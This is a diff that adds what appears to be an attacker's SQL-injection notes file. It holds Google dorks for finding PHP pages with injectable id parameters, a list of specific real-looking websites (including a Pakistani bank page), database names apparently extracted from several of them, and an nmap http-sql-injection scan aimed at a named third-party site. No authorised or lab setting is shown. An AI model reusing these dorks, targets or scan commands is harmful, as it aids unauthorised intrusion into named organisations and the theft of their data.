@@ -1,0 +1,37 @@
+Google Dork: 
+site:*.in inurl:".php?cat="
+site:*.pk inurl:"products.php?id="
+site:*.id inurl:"order.php?id="
+
+https://dreamworld.pk/affiliations/details.php?id=150&AspxAutoDetectCookieSupport=1
+https://www.fsaijazuddin.pk/bookdetail.php?bookid=685
+https://www.hrist.pk/labs.php?id=2
+https://www.af.org.pk/publication-detail.php?id=7
+https://cncsurgicals.com/products.php?id=92
+cncsurgicals__db
+
+nmap -sV --script=http-sql-injection berkeleyrecycling.org -p 80
+
+https://www.afschoolhasimara.com/gallery-zoom.php?id=92
+database=gschxlhazm_asfhaisscoho
+
+http://www.rosonelec.com/order.php?id=54
+database=hdm0660171_db
+
+https://www.fvpadel.com/noticia.asp?indoticia=[t]
+25 database
+
+https://cncsurgicals.com/products.php?id=92
+cncsurgicals__db
+
+http://almubeenintl.com/main.php?cid=1
+almubeen_db
+
+http://spiderinstruments.com/products.php?id=215
+spiderin_db
+
+http://Onstylesports.com/products.php?id=92
+onstyles_db
+
+https://www.fcibank.com.pk/index.php?route=common/page&pageid=-1
+fcibankc_459625_fci
